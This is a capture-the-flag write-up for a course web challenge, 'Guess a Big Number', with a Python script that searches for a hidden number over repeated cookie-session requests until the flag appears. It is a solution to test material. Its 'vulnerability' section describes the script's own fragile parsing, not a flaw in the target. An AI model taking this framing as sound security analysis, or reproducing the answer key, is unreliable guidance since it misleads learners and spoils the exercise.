# Challenge "Guess a Big Number" Writeup

## Vulnerability: Lack of Robustness in Response Parsing

### Where: Parsing server responses and decision-making based on extracted values

### Impact: The code may be susceptible to unexpected server responses or manipulations in input, leading to unintended behavior or exploitation.

**NOTE**: The provided code interacts with a web server, sets user cookies, and attempts to find a specific value by iteratively making requests. The loop makes decisions based on the content of the server responses.

## Steps to reproduce:

1. The code establishes a session using the `requests.Session()` object to persist cookies between requests.

2. Accesses the first link to set the user cookie.

3. Initiates a loop to make iterative requests until a specific condition is met.

4. In each iteration, makes a request to the server with an increasing or decreasing value appended to the URL.

5. Decides the direction of the next request based on the content of the server response. If the response contains "Higher," the value is increased; if it contains "Lower," the value is decreased.

6. Breaks out of the loop if the response contains "SSof" and prints the final response.

**Observations:**

- The code relies on the assumption that the server will respond in a specific format, and any deviation might lead to extraction errors or unexpected behavior.

- Lack of robustness in response parsing may make the code vulnerable to changes in the server's response structure.

- The code does not handle exceptions or errors gracefully, and improvements can be made for better error handling.

## Code:

```python
import requests

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22052"

# Create a session to persist the cookies between requests
s = requests.Session()

# Access the first link to set the user cookie
s.get(link)
i = 0

while i != -1:
    response = s.get(link + "/number/" + str(i))
    if "Higher" in response.text:
        i += 1000
    elif "Lower" in response.text:
        print(response.text + "\n" + "i = " + str(i))
        break

while i != -1:
    response = s.get(link + "/number/" + str(i))
    if "Lower" in response.text:
        i -= 100
    elif "Higher" in response.text:
        print(response.text + "\n" + "i = " + str(i))
        break

while i != -1:
    response = s.get(link + "/number/" + str(i))
    if "Higher" in response.text:
        i += 10
    elif "Lower" in response.text:
        print(response.text + "\n" + "i = " + str(i))
        break

while i != -1:
    response = s.get(link + "/number/" + str(i))
    if "Lower" in response.text:
        i -= 1
    elif "SSof" in response.text:
        print(response.text + "\n" + "i = " + str(i))
        break
